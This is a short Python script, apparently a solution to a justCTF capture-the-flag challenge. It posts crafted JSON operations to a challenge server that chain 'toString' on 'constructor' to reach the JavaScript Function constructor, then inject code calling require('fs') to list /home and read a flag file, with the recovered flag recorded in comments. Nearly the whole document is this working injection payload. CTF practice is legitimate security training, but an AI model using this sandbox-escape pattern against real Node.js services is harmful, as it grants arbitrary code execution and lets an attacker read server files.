import requests


url = "http://i6ok24moo2etj0qvf2rfxlsc11gvt5.njs.web.jctf.pro/"

# 2 steps in 1
# text = requests.post(url, json=[{"op": "toString", "x": "constructor"}, {"op": "toString", "x": "constructor"}, {"op": "result", "x": "){return require('fs').readdirSync('/home')+'\\n'+require('fs').readFileSync('/home/RealFlagIsHere1337.txt')})//", "y": "return this"}, {"op": "result"}]).text

text = requests.post(url, json=[{"op": "toString", "x": "constructor"}, {"op": "toString", "x": "constructor"}, {"op": "result", "x": "){return require('fs').readdirSync('/home')})//", "y": "return this"}, {"op": "result"}]).text

print(text)
# RealFlagIsHere1337.txt


text = requests.post(url, json=[{"op": "toString", "x": "constructor"}, {"op": "toString", "x": "constructor"}, {"op": "result", "x": "){return require('fs').readFileSync('/home/RealFlagIsHere1337.txt')})//", "y": "return this"}, {"op": "result"}]).text
print(text)
# justCTF{manny_manny_bugs_can_hide_in_this_engine!!!}